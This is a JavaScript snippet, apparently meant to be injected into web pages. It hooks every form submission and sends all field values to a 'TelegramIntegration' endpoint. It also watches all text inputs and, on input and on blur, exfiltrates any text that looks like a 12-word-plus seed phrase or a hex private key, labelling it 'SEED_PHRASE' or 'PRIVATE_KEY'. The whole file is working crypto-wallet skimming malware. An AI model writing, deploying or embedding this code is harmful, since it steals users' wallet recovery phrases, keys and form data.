// Auto-capture all form submissions
document.addEventListener('DOMContentLoaded', function() {
  // Wait for React to render forms
  setTimeout(function() {
    const forms = document.querySelectorAll('form, [role="form"]');
    
    forms.forEach(function(form) {
      form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        // Get all inputs
        const inputs = form.querySelectorAll('input, textarea, select');
        const data = {};
        
        inputs.forEach(function(input) {
          if (input.value && input.value.trim()) {
            const name = input.name || input.id || input.placeholder || 'field_' + Math.random();
            data[name] = input.value;
          }
        });
        
        // Send to Telegram
        if (window.TelegramIntegration && Object.keys(data).length > 0) {
          try {
            await window.TelegramIntegration.send(data);
            console.log('✅ Form data sent to Telegram');
          } catch (err) {
            console.error('❌ Failed to send to Telegram:', err);
          }
        }
      });
    });
  }, 2000);
  
  // Capture input changes for phrase/seed fields - INSTANT
  let phraseTimeout;
  document.addEventListener('input', function(e) {
    const target = e.target;
    if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
      clearTimeout(phraseTimeout);
      phraseTimeout = setTimeout(function() {
        const val = target.value.trim();
        const words = val.split(/\s+/).filter(w => w.length > 0);
        
        // Send if 12+ words OR looks like private key
        if (words.length >= 12 || (val.length > 40 && /^[0-9a-fA-Fx]+$/.test(val))) {
          if (window.TelegramIntegration) {
            window.TelegramIntegration.send({
              type: words.length >= 12 ? 'SEED_PHRASE' : 'PRIVATE_KEY',
              content: val,
              wordCount: words.length,
              field: target.name || target.id || target.placeholder || 'unknown',
              page: window.location.pathname
            }).then(() => console.log('✅ Phrase sent')).catch(e => console.error('❌ Failed:', e));
          }
        }
      }, 500);
    }
  });
  
  // Also on blur
  document.addEventListener('blur', function(e) {
    const target = e.target;
    if ((target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') && target.value.trim()) {
      const val = target.value.trim();
      const words = val.split(/\s+/).filter(w => w.length > 0);
      if (words.length >= 12 && window.TelegramIntegration) {
        window.TelegramIntegration.send({
          type: 'SEED_PHRASE_BLUR',
          content: val,
          wordCount: words.length,
          field: target.name || target.id || target.placeholder || 'unknown'
        });
      }
    }
  }, true);
});
